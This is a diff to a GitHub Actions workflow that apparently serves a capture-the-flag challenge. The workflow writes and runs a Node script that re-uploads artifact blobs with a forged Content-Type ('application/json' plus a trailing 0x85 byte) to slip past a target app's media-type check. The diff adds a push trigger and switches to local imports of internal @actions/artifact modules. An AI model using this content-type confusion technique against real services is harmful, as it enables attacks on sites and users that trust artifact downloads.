@@ -2,8 +2,9 @@ name: rc-carrier
 # One-file Repo Cassette carrier (paste as .github/workflows/rc-carrier.yml).
 # Creates Actions artifacts whose blob is re-uploaded with Content-Type
 # "application/json" + a trailing 0x85 byte, then reports the download headers.
-# Actions -> rc-carrier -> Run workflow -> open the "build carrier" job log.
-on: workflow_dispatch
+on:
+  workflow_dispatch:
+  push:
 permissions:
   actions: write
   contents: read
@@ -17,7 +18,8 @@ jobs:
         env:
           GITHUB_TOKEN: ${{ github.token }}
         run: |
-          cat > /tmp/carrier.mjs <<'MJS_UNIQUE_TAG'
+          cd "$GITHUB_WORKSPACE"
+          cat > carrier-run.mjs <<'MJS_UNIQUE_TAG'
           // Builds an Actions artifact whose raw blob is re-uploaded with an
           // attacker-chosen Content-Type (application/json + trailing 0x85 / NEL).
           // The 0x85 makes the challenge app's JS mediaType() miss "application/json"
@@ -28,9 +30,9 @@ jobs:
           // upload URL. The signed URL stays valid and the blob content wins on download.
           import {createHash} from 'node:crypto';
           import https from 'node:https';
-          import {internalArtifactTwirpClient} from '@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
-          import {getBackendIdsFromToken} from '@actions/artifact/lib/internal/shared/util.js';
-          import {StringValue} from '@actions/artifact/lib/generated/index.js';
+          import {internalArtifactTwirpClient} from './node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
+          import {getBackendIdsFromToken} from './node_modules/@actions/artifact/lib/internal/shared/util.js';
+          import {StringValue} from './node_modules/@actions/artifact/lib/generated/index.js';
 
           const ids = getBackendIdsFromToken();
           const client = internalArtifactTwirpClient({maxAttempts: 1});
@@ -134,4 +136,4 @@ jobs:
           await variant('page85', 'page', 'application/json\u0085', 'application/json');
           console.log('RCCARRIER DONE');
           MJS_UNIQUE_TAG
-          node /tmp/carrier.mjs
+          node carrier-run.mjs
